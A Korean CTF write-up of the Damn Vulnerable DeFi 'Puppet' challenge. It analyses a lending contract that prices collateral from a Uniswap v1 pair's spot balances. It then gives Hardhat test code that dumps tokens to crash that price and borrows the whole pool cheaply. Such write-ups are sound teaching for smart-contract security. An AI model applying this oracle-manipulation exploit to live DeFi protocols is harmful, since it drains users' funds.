https://teberr.notion.site/Damn-Vulnerable-Defi-Puppet-688fd354570b49b28d457a1a5c5b85fe

# 문제 소개

![문제.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/a5ccd02c-0d2e-4ffb-88df-b81b2e755f6a/%EB%AC%B8%EC%A0%9C.png)

문제 #8 - Puppet

DVT를 대출해주는 대출풀이 있습니다. 이 대출풀은 대출을 하기 전에 먼저 대출금액의 두배를 먼저 예치해야 합니다. 현재 이 대출풀에는 100000 DVT의 유동성을 가지고 있습니다. DVT마켓이 유니스왑 v1 거래소에 현재 열려있으며 유동성이 10이더와 10DVT 입니다. 

25이더와 1000DVT를 가지고 이 대출 풀에 있는 모든 토큰을 탈취하세요

# 코드 분석 및 공격 설계

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

contract PuppetPool is ReentrancyGuard {

    using Address for address payable;

    mapping(address => uint256) public deposits;
    address public immutable uniswapPair;
    DamnValuableToken public immutable token;
    
    event Borrowed(address indexed account, uint256 depositRequired, uint256 borrowAmount);

    constructor (address tokenAddress, address uniswapPairAddress) {
        token = DamnValuableToken(tokenAddress);
        uniswapPair = uniswapPairAddress;
    }

    // Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH
    function borrow(uint256 borrowAmount) public payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(borrowAmount);
        
        require(msg.value >= depositRequired, "Not depositing enough collateral");
        
        if (msg.value > depositRequired) {
            payable(msg.sender).sendValue(msg.value - depositRequired);
        }

        deposits[msg.sender] = deposits[msg.sender] + depositRequired;

        // Fails if the pool doesn't have enough tokens in liquidity
        require(token.transfer(msg.sender, borrowAmount), "Transfer failed");

        emit Borrowed(msg.sender, depositRequired, borrowAmount);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * 2 / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }

     /**
     ... functions to deposit, redeem, repay, calculate interest, and so on ...
     */

}
```

PuppetPool 컨트랙트는 borrow, calculateDepositRequired, _computeOraclePrice 함수를 가지고 있다.

PuppetPool의 컨트랙트의 생성자로 인하여 token은 DVT 토큰을, uniswapPair에는 유니스왑페어의 주소가 저장되어있다.

```solidity
    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return uniswapPair.balance * (10 ** 18) / token.balanceOf(uniswapPair);
    }
```

유니스왑페어의 자산에 따라 토큰(DVT)의 가격을 이더(wei)로 계산해주는 함수이다.

uniswapPair.balance는 유니스왑페어에 있는 이더리움의 자산

token.balanceOf(uniswapPair)는 유니스왑페어에 있는 토큰의 자산을 의미한다.

```solidity
function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * 2 / 10 ** 18;
 }
```

calculateDepositRequired 함수는 이더(wei)로 계산해준 토큰(DVT)가격에 * 2 * amount를 해준 후 10^18으로 나누어준다.  즉 DVT 토큰을 amount만큼 빌리려면 얼마나 이더를 입금해야 하는지를 알려준다.

```solidity
    // Allows borrowing `borrowAmount` of tokens by first depositing two times their value in ETH
    function borrow(uint256 borrowAmount) public payable nonReentrant {
        uint256 depositRequired = calculateDepositRequired(borrowAmount);
        
        require(msg.value >= depositRequired, "Not depositing enough collateral");
        
        if (msg.value > depositRequired) {
            payable(msg.sender).sendValue(msg.value - depositRequired);
        }

        deposits[msg.sender] = deposits[msg.sender] + depositRequired;

        // Fails if the pool doesn't have enough tokens in liquidity
        require(token.transfer(msg.sender, borrowAmount), "Transfer failed");

        emit Borrowed(msg.sender, depositRequired, borrowAmount);
    }
```

borrow 함수는 다음과 같은 과정을 거친다.

1. depositRequired에 빌리려는 양에 따른 입금해야 하는 금액을 계산해 준다. ( 빌리려는 금액*2)
2. 받은 이더가 빌리려는 금액의 2배인지 확인한다.
3. 받은 이더가 빌리려는 금액의 2배보다 크면 입금해야하는 금액의 초과분만큼 msg.sender에게 다시 돌려준다.
4. msg.sender와 입금해야 하는 금액을 매핑하여 기존 값에 더해준다.
5. 만약 풀에 유동성이 부족하다면 토큰(DVT)의 전송은 실패한다.

이더를 담보로 DVT 토큰을 대출받기 때문에 플래시론과 다르게 이 대출이 끝나고나서 DVT 토큰을 바로 갚아놓을 필요는 없다. 즉 목적은 25이더로 100000DVT를 대출하는 것이 목적이다.

이를 위한 핵심은 유동성에 따라서 유니스왑 페어에서의 DVT 토큰 가격이 변동된다는 것이다. 

예를 들어 보자 처음에는 유니스왑 페어에 이더와 DVT 토큰각각 10개씩이라서 1:1로 되어있기 때문에 둘의 가격은 1이더=1DVT가 된다. 근데 이더가 10개 DVT토큰이 5개라면?

계산 식이 `이더의 개수 / DVT 토큰의 개수` 이므로 2가 된다. 즉 1DVT 토큰의 가격이 2이더리움이 된다.

만약 유니스왑 풀에 DVT토큰이 더 많다고 가정해보자. 이더가 10개 DVT 토큰이 1000개라면? 10/1000 이므로 1DVT 토큰의 가격이 0.001이더가 된다. 따라서 이경우 1000DVT토큰을 빌리기 위해서는 2이더만 있으면 된다.

즉 유니스왑 풀에 있는 이더가 적으면 적을수록, DVT 토큰이 많으면 많을 수록 우리는 대출 풀에서 적은 이더를 보증금으로 걸고 엄청난 수의 DVT 토큰을 대출받을 수 있다.

10/500이면 1DVT 토큰이 0.002이더가 됨. 4이더면 1000 DVT를 빌릴 수 있다.

따라서 유니스왑 풀에 연결하여 가지고있는 1000DVT 토큰으로 이더를 최대한 많이 스왑하자. 그러면 유니스왑 풀에 있는 이더리움은 줄어들고 DVT 토큰의 개수는 많아질 것이다.

유니스왑 독스에서 교환을 위한 내용을 살펴보자 [https://docs.uniswap.org/protocol/V1/reference/exchange](https://docs.uniswap.org/protocol/V1/reference/exchange)

![토큰으로 얻을 수 있는 이더의 개수.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/75c4894f-20bd-40f7-89e7-e2194c10c1f9/%ED%86%A0%ED%81%B0%EC%9C%BC%EB%A1%9C_%EC%96%BB%EC%9D%84_%EC%88%98_%EC%9E%88%EB%8A%94_%EC%9D%B4%EB%8D%94%EC%9D%98_%EA%B0%9C%EC%88%98.png)

내가 전달한 토큰의 양으로 살 수 있는 이더의 양을 보여주는 함수이다. 이를 이용해서 내가 1000DVT 토큰으로 유니스왑에서 스왑할 수 있는 이더의 양을 알 수 있다.

![토큰으로 이더 얻기.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/94530646-0052-48e6-bd9e-57a69f87c609/%ED%86%A0%ED%81%B0%EC%9C%BC%EB%A1%9C_%EC%9D%B4%EB%8D%94_%EC%96%BB%EA%B8%B0.png)

tokenToEthTransferInput 은 내가 토큰을 파는양과 최소한으로 살 이더의 양, 트랜잭션 데드라인, 이더를 받을 주소를 넣어서 토큰을 보내고 이더를 받는 함수이다.

![swaps와 transfer의 차이.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/463dd0ad-f786-40ef-a4bc-cdeaaba92160/swaps%EC%99%80_transfer%EC%9D%98_%EC%B0%A8%EC%9D%B4.png)

Swaps와 Transfers의 차이는 한가지다.

Swaps는 산 것을 구매자에게 전송을 해주고 Tranasfer는 적어준 주소로 보내는 것이다. 

이를 이용하여 유니스왑에 DVT 토큰을 보내고 이더를 받아온 후 망가진 비율을 기반으로 대출 풀에서 가진 이더를 기반으로 100,000DVT 토큰을 대출 받자.

 

# 공격

이제 test 폴더의 puppet.challange.js 에서 테스트를 통해 공격을 실행하자.

```tsx
const exchangeJson = require("../../build-uniswap-v1/UniswapV1Exchange.json");
const factoryJson = require("../../build-uniswap-v1/UniswapV1Factory.json");

const { ethers } = require('hardhat');
const { expect } = require('chai');

// Calculates how much ETH (in wei) Uniswap will pay for the given amount of tokens
function calculateTokenToEthInputPrice(tokensSold, tokensInReserve, etherInReserve) {
    return tokensSold.mul(ethers.BigNumber.from('997')).mul(etherInReserve).div(
        (tokensInReserve.mul(ethers.BigNumber.from('1000')).add(tokensSold.mul(ethers.BigNumber.from('997'))))
    )
}

describe('[Challenge] Puppet', function () {
    let deployer, attacker;

    // Uniswap exchange will start with 10 DVT and 10 ETH in liquidity
    const UNISWAP_INITIAL_TOKEN_RESERVE = ethers.utils.parseEther('10');
    const UNISWAP_INITIAL_ETH_RESERVE = ethers.utils.parseEther('10');

    const ATTACKER_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('1000');
    const ATTACKER_INITIAL_ETH_BALANCE = ethers.utils.parseEther('25');
    const POOL_INITIAL_TOKEN_BALANCE = ethers.utils.parseEther('100000')

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */  
        [deployer, attacker] = await ethers.getSigners();

        const UniswapExchangeFactory = new ethers.ContractFactory(exchangeJson.abi, exchangeJson.evm.bytecode, deployer);
        const UniswapFactoryFactory = new ethers.ContractFactory(factoryJson.abi, factoryJson.evm.bytecode, deployer);

        const DamnValuableTokenFactory = await ethers.getContractFactory('DamnValuableToken', deployer);
        const PuppetPoolFactory = await ethers.getContractFactory('PuppetPool', deployer);

        await ethers.provider.send("hardhat_setBalance", [
            attacker.address,
            "0x15af1d78b58c40000", // 25 ETH
        ]);
        expect(
            await ethers.provider.getBalance(attacker.address)
        ).to.equal(ATTACKER_INITIAL_ETH_BALANCE);

        // Deploy token to be traded in Uniswap
        this.token = await DamnValuableTokenFactory.deploy();

        // Deploy a exchange that will be used as the factory template
        this.exchangeTemplate = await UniswapExchangeFactory.deploy();

        // Deploy factory, initializing it with the address of the template exchange
        this.uniswapFactory = await UniswapFactoryFactory.deploy();
        await this.uniswapFactory.initializeFactory(this.exchangeTemplate.address);

        // Create a new exchange for the token, and retrieve the deployed exchange's address
        let tx = await this.uniswapFactory.createExchange(this.token.address, { gasLimit: 1e6 });
        const { events } = await tx.wait();
        this.uniswapExchange = await UniswapExchangeFactory.attach(events[0].args.exchange);

        // Deploy the lending pool
        this.lendingPool = await PuppetPoolFactory.deploy(
            this.token.address,
            this.uniswapExchange.address
        );
    
        // Add initial token and ETH liquidity to the pool
        await this.token.approve(
            this.uniswapExchange.address,
            UNISWAP_INITIAL_TOKEN_RESERVE
        );
        await this.uniswapExchange.addLiquidity(
            0,                                                          // min_liquidity
            UNISWAP_INITIAL_TOKEN_RESERVE,
            (await ethers.provider.getBlock('latest')).timestamp * 2,   // deadline
            { value: UNISWAP_INITIAL_ETH_RESERVE, gasLimit: 1e6 }
        );
        
        // Ensure Uniswap exchange is working as expected
        expect(
            await this.uniswapExchange.getTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                { gasLimit: 1e6 }
            )
        ).to.be.eq(
            calculateTokenToEthInputPrice(
                ethers.utils.parseEther('1'),
                UNISWAP_INITIAL_TOKEN_RESERVE,
                UNISWAP_INITIAL_ETH_RESERVE
            )
        );
        
        // Setup initial token balances of pool and attacker account
        await this.token.transfer(attacker.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        await this.token.transfer(this.lendingPool.address, POOL_INITIAL_TOKEN_BALANCE);

        // Ensure correct setup of pool. For example, to borrow 1 need to deposit 2
        expect(
            await this.lendingPool.calculateDepositRequired(ethers.utils.parseEther('1'))
        ).to.be.eq(ethers.utils.parseEther('2'));

        expect(
            await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE)
        ).to.be.eq(POOL_INITIAL_TOKEN_BALANCE.mul('2'));
    });

    it('Exploit', async function () {
       /** CODE YOUR EXPLOIT HERE */
    });

    after(async function () {
        /** SUCCESS CONDITIONS */

        // Attacker has taken all tokens from the pool        
        expect(
            await this.token.balanceOf(this.lendingPool.address)
        ).to.be.eq('0');
        expect(
            await this.token.balanceOf(attacker.address)
        ).to.be.gt(POOL_INITIAL_TOKEN_BALANCE);
    });
});
```

즉 공격은 다음과 같이 구성하자.

1. 유니스왑에 DVT 토큰을 보내면 얻을 수 있는 이더의 양을 알아낸다.
2. 유니스왑에 DVT 토큰을 보내고 이더를 받아온다.
3. 이 이더를 기반으로 대출 풀에서 10만DVT 토큰을 대출받는다.

9900695134061569016

```tsx
it('Exploit', async function () {
        console.log(await this.uniswapExchange.getTokenToEthInputPrice(
            ethers.utils.parseEther('1000'),
            { gasLimit: 1e6 }));
    });
```

를 통해서 이더의 양을 미리 알아내면 

![이더의양.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ff3b8522-72ab-4030-8e3f-a6dff64cec10/%EC%9D%B4%EB%8D%94%EC%9D%98%EC%96%91.png)

hex 값으로 결과가 나온다. 이는 9900695134061569016 이고 약 9.9이더다.

문제에서 얻고자 하는 것은 최종적으로 대출풀에 있는 토큰 10만개를 다 가져오고 공격자의 주소에 토큰이 10만개보다 커야하므로 토큰을 1000개보다 덜 보내도 되는지 계산해보았다. (안그러면 나중에 다시 스왑해야해서 귀찮음)

```tsx
it('Exploit', async function () {
        console.log(await this.uniswapExchange.getTokenToEthInputPrice(
            ethers.utils.parseEther('999'),
            { gasLimit: 1e6 }));
    });
```

![999토큰으로 이더의양.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/ddf317ac-038a-4070-9bc5-594814b3839a/999%ED%86%A0%ED%81%B0%EC%9C%BC%EB%A1%9C_%EC%9D%B4%EB%8D%94%EC%9D%98%EC%96%91.png)

그 결과는 9900596717902431702으로 여전히 9.9이더로 나온다.

따라서 999 DVT 토큰을 보내고나면 유니스왑에는 10이더 * 10DVT 토큰으로 이루어져있던 비율이 0.1이더 *1000 DVT 토큰 가량으로 바뀌게 된다. 그러면 1이더는 약 1만 DVT 토큰이므로 10만 DVT 토큰을 대출하기 위해서는 약 20이더 (두배를 입금해야 하므로)정도 될것이다. 공격자는 아마 초기 25이더 + 9.9이더를 받을 것이기 때문에 34이더 이상을 가지고 있어 충분한 이더를 가질 것으로 예상된다.

혹시 모르니 보내고 난 후 10만 DVT토큰을 대출하기 위해 적절한 이더를 가지고 있는지 확인해보자.

```tsx
it('Exploit', async function () {
        await this.token.connect(attacker).approve( this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        
        console.log(await this.uniswapExchange.getTokenToEthInputPrice(
            ethers.utils.parseEther('999'),
            { gasLimit: 1e6 }));
        
        await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(
            ethers.utils.parseEther('999'),
            ethers.utils.parseEther('9'),
            (await ethers.provider.getBlock('latest')).timestamp * 2,
            attacker.address
            );
        
        let deposit_eth = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log(await ethers.provider.getBalance(attacker.address));
        console.log(deposit_eth);
    });
```

유니스왑에서 내 토큰을 가져갈 수 있도록 먼저 approve를 해주어야 한다.

그 다음 tokenToEtherTransferInput(팔 토큰의 양, 구매할 최소 이더의 양, 트랜잭션의 기한, 보낼주소)에 맞춰서 가지고 있는 999DVT 토큰을 유니스왑에 있는 이더로 바꾸어 가져온다. 

![로그.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/9dca6775-7300-4520-86e3-6289ec9b0391/%EB%A1%9C%EA%B7%B8.png)

그럼 이제 위에서 부터 

- 999DVT 토큰으로 스왑하면 얻을 수 있는 이더 (약 9.9이더)
- 공격자의 지갑에 있는 이더 (약 34.9이더,  34900461052464945634wei)
- 10만 DVT 토큰을 대출받기위해 필요한이더(약 19.7이더, 19703326481183000000wei)

이다. 실제로 10만 DVT 토큰을 대출 받기 위해 필요한 이더는 충분한 것을 확인했으므로 borrow를 통해 대출받으면 10만1DVT 토큰을 얻게 되어 문제를 클리어하게 된다.

```tsx
it('Exploit', async function () {
        await this.token.connect(attacker).approve( this.uniswapExchange.address, ATTACKER_INITIAL_TOKEN_BALANCE);
        
        console.log(await this.uniswapExchange.getTokenToEthInputPrice(
            ethers.utils.parseEther('999'),
            { gasLimit: 1e6 }));
        
        await this.uniswapExchange.connect(attacker).tokenToEthTransferInput(
            ethers.utils.parseEther('999'),
            ethers.utils.parseEther('9'),
            (await ethers.provider.getBlock('latest')).timestamp * 2,
            attacker.address
            );
        
        let deposit_eth = await this.lendingPool.calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
        console.log(await ethers.provider.getBalance(attacker.address));
        console.log(deposit_eth);
        await this.lendingPool.connect(attacker).borrow(POOL_INITIAL_TOKEN_BALANCE,{value:deposit_eth});
    });
```

대출 풀의 borrow 함수를 이용해 대출 풀에 있는 모든 토큰을 대출받기 위해 필요한 이더를 보내면서 대출받았다.

![성공.PNG](https://s3-us-west-2.amazonaws.com/secure.notion-static.com/bc49dd7c-d122-41b1-a0c4-f949ff26a2ae/%EC%84%B1%EA%B3%B5.png)

npm run puppet으로 Exploit이 성공적으로 진행되어 문제의 목표를 달성한 것을 확인할 수 있다.
